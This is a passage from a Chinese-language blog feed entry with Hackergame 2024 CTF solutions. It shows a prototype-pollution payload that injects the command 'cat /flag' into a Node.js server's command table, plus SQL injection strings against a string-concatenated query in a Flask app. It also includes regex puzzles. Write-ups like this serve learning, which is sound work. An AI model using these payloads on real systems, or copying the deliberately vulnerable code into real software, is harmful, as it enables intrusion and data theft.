class="token punctuation">&#125;</span>  <span class="token comment">// Set the value at the last key</span>  current<span class="token punctuation">[</span>keys<span class="token punctuation">[</span>keys<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> value<span class="token punctuation">;</span>  res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">message</span><span class="token operator">:</span> <span class="token string">"OK"</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// GET /get - Get a key-value pair in the store</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"/get"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  <span class="token keyword">const</span> key <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>key<span class="token punctuation">;</span>  <span class="token keyword">const</span> keys <span class="token operator">=</span> key<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">let</span> current <span class="token operator">=</span> store<span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> keys<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> key <span class="token operator">=</span> keys<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>current<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">message</span><span class="token operator">:</span> <span class="token string">"Not exists."</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    current <span class="token operator">=</span> current<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">message</span><span class="token operator">:</span> current <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// GET /execute - Run commands which are constant and obviously safe.</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"/execute"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  <span class="token keyword">const</span> key <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>cmd<span class="token punctuation">;</span>  <span class="token keyword">const</span> cmd <span class="token operator">=</span> cmds<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">;</span>  res<span class="token punctuation">.</span><span class="token function">setHeader</span><span class="token punctuation">(</span><span class="token string">"content-type"</span><span class="token punctuation">,</span> <span class="token string">"text/plain"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token function">execSync</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"*"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">sendFile</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">"public"</span><span class="token punctuation">,</span> <span class="token string">"index.html"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Start the server</span><span class="token keyword">const</span> <span class="token constant">PORT</span> <span class="token operator">=</span> <span class="token number">3000</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token constant">PORT</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">KV Service is running on port </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token constant">PORT</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></details><p>注：</p><ul><li><p>如果你在好奇标题是什么意思，可以搜索一个标题叫 “Mongo DB Is Web Scale” 的视频（虽然与本题解法无关）。</p></li><li><p>flag 在 <code>/flag</code> 文件中。</p></li></ul></div></div></details><p>阅读服务端代码，发现<code>cmds</code>里有一些命令，但显然没有<code>cat /flag</code>，而我们又只能通过<code>execute</code>接口去执行命令，那要怎么办呢？</p><p>注意到我们可以用<code>set</code>接口为<code>current</code>这个变量设定键值对，而<code>JavaScript</code>当中，通过点运算可以获取到的attribute，也可以通过中括号运算获取，赋值也是同理，这样想法就很自然了，这是一个ProtoType污染攻击。</p><p>我们直接set：</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>    <span class="token property">"key"</span><span class="token operator">:</span> <span class="token string">"__proto__.catflag"</span><span class="token punctuation">,</span>    <span class="token property">"value"</span><span class="token operator">:</span> <span class="token string">"cat /flag"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>然后<code>execute?cmd=catflag</code>，即可获取flag。</p><h2 id="PaoluGPT"><a href="#PaoluGPT" class="headerlink" title="PaoluGPT"></a>PaoluGPT</h2><details class="toggle" ><summary class="toggle-button" style="">查看题面</summary><div class="toggle-content"><div class="note primary simple"><p>在大语言模型时代，几乎每个人都在和大语言模型聊天。小 Q 也想找一个方便使用的 GPT 服务，所以在熟人推荐下，他注册了某个 GPT 服务，并且付了几块钱。只是出乎小 Q 意料的是，他才用了几天，服务商就跑路了！跑路的同时，服务商还公开了一些用户的聊天记录。小 Q 看着这些聊天记录，突然发现里面好像有 flag……</p><p><a href="https://github.com/USTC-Hackergame/hackergame2024-writeups/raw/refs/heads/master/official/PaoluGPT/files/paolugpt.zip">本题附件</a></p><p><strong>免责声明：本题数据来源自 <a href="https://modelscope.cn/datasets/m-a-p/COIG-CQIA/">COIG-CQIA 数据集</a>。本题显示的所有该数据集中的数据均不代表 Hackergame 组委会的观点、意见与建议。</strong></p></div></div></details><h3 id="千里挑一"><a href="#千里挑一" class="headerlink" title="千里挑一"></a>千里挑一</h3><p>打开网页，发现有一堆聊天记录（999个），<del>直接一个一个手动点开</del> 写个爬虫很快就找到了第一个flag。</p><h3 id="窥视未知"><a href="#窥视未知" class="headerlink" title="窥视未知"></a>窥视未知</h3><p>那么第二个flag会在哪里呢？根据小题名“窥视未知”，感觉这个没找到的flag像是藏在什么未知的地方（什么废话文学）</p><p>我看了好久题目，发现居然这题还有个附件可以下载。。。火速下载下来，发现一个函数：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/view"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">view</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    conversation_id <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"conversation_id"</span><span class="token punctuation">)</span>    results <span class="token operator">=</span> execute_query<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"select title, contents from messages where id = '</span><span class="token interpolation"><span class="token punctuation">&#123;</span>conversation_id<span class="token punctuation">&#125;</span></span><span class="token string">'"</span></span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"view.html"</span><span class="token punctuation">,</span> message<span class="token operator">=</span>Message<span class="token punctuation">(</span><span class="token boolean">None</span><span class="token punctuation">,</span> results<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> results<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里的SQL语句居然是直接字符串拼接来的，那么自然可以SQL注入，然后注意到：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/list"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">list</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    results <span class="token operator">=</span> execute_query<span class="token punctuation">(</span><span class="token string">"select id, title from messages where shown = true"</span><span class="token punctuation">,</span> fetch_all<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>    messages <span class="token operator">=</span> <span class="token punctuation">[</span>Message<span class="token punctuation">(</span>m<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> m<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span> <span class="token keyword">for</span> m <span class="token keyword">in</span> results<span class="token punctuation">]</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"list.html"</span><span class="token punctuation">,</span> messages<span class="token operator">=</span>messages<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看来还有<code>shown = false</code>的对话，于是我们只要构造<code>conversation_id</code>：</p><pre class="line-numbers language-raw" data-language="raw"><code class="language-raw">1&#39; OR shown &#x3D; false--<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>即可找到flag2。</p><p>那么用同样的方法也可以找到flag1：</p><pre class="line-numbers language-raw" data-language="raw"><code class="language-raw">1&#39; OR contents LIKE &#39;%flag%&#39;--<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="强大的正则表达式"><a href="#强大的正则表达式" class="headerlink" title="强大的正则表达式"></a>强大的正则表达式</h2><details class="toggle" ><summary class="toggle-button" style="">查看题面</summary><div class="toggle-content"><div class="note primary simple"><p>从小 Q 开始写代码以来，他在无数的项目、帖子中看到各种神秘的字符串，听人推荐过，这就是传说中万能的正则表达式。本着能摆烂就绝不努力的原则，小 Q 从来没想过了解这门高雅艺术，遇到不懂的正则表达式就通通丢给 LLM 嘛，他这样想到。不过夜深人静的时候，小 Q 也时常在纠结写这么多 <code>switch-case</code> 到底是为了什么。</p><p>终于在一个不眠夜，小 Q 一口气看完了正则表达式的教程。哈？原来这么简单？小 Q 并两分钟写完了自测题目，看着教程剩下的目录，「分组」、「贪婪」、「前瞻」，正则表达式也不过如此嘛，他心想，也就做一些邮箱匹配之类的简单任务罢了。</p><p>正当他还沉浸在「不过如此」的幻想中，他刷到了那个关于正则表达式的古老而又神秘的传说：</p><p>「正则表达式可以用来计算取模和 CRC 校验……」</p><p><a href="https://github.com/USTC-Hackergame/hackergame2024-writeups/raw/refs/heads/master/official/%E5%BC%BA%E5%A4%A7%E7%9A%84%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/files/powerful_re.py">题目源代码</a></p></div></div></details><p>要写三个正则表达式完成三种不同的计算，限制字符为<code>0123456789()|*</code></p><h3 id="Easy"><a href="#Easy" class="headerlink" title="Easy"></a>Easy</h3><p>计算10进制下对16的取模，要求取模为0时匹配成功。</p><p>这就是个送分题，我们知道10进制下一个数是否为16的倍数可以根据其最后四位数字来判断。</p><p>于是只要遍历一下最后四位数字，再把前面的一拼就行了：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">s <span class="token operator">=</span> <span class="token string">'(0|1|2|3|4|5|6|7|8|9)*('</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10000</span> <span class="token operator">//</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    s <span class="token operator">+=</span> <span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i <span class="token operator">*</span> <span class="token number">16</span><span class="token punctuation">:</span><span class="token format-spec">04</span><span class="token punctuation">&#125;</span></span><span class="token string">|'</span></span>s <span class="token operator">=</span> s<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">')'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h3><p>计算2进制下对13的取模，要求取模为0时匹配成功。</p><p>这我就不会了，虽然知道是要去构造有限状态自动机，但其实我一直都不会这个玩意，也有点懒得学（赛后一定补上）</p><p>不过好在我找到一个老哥GitHub上写的一个函数：<a href="https://github.com/NIaa/codewars/tree/master/Solutions/1_kyu/Regular%20Expression%20for%20Binary%20Numbers%20Divisible%20by%20n">Regular Expression for Binary Numbers Divisible by n</a></p><p>这不是完美契合这个题？于是运行了一下，把<code>+</code>换成了<code>*</code>，嫖到flag。</p><h3 id="Hard"><a href="#Hard" class="headerlink" title="Hard"></a>Hard</h3><p>搜不到一点，赛后一定恶补有限状态自动机。</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;本文是Hackergame 2024 题解的第一部分。&lt;/p&gt;
&lt;h2 id=&quot;签到&quot;&gt;&lt;a href=&quot;#签到&quot; class=&quot;headerlink&quot; title=&quot;签到&quot;&gt;&lt;/a&gt;签到&lt;/h2&gt;&lt;details class=&quot;toggle&quot; &gt;&lt;summary</summary>
        
      
    
    
    
    <category term="CTF题解" scheme="https://blog.fyz666.xyz/categories/ctf%E9%A2%98%E8%A7%A3/"/>
    
    
    <category term="Hackergame" scheme="https://blog.fyz666.xyz/tags/hackergame/"/>
    
    <category term="Hackergame 2024" scheme="https://blog.fyz666.xyz/tags/hackergame-2024/"/>
    
  </entry>
  
</feed>
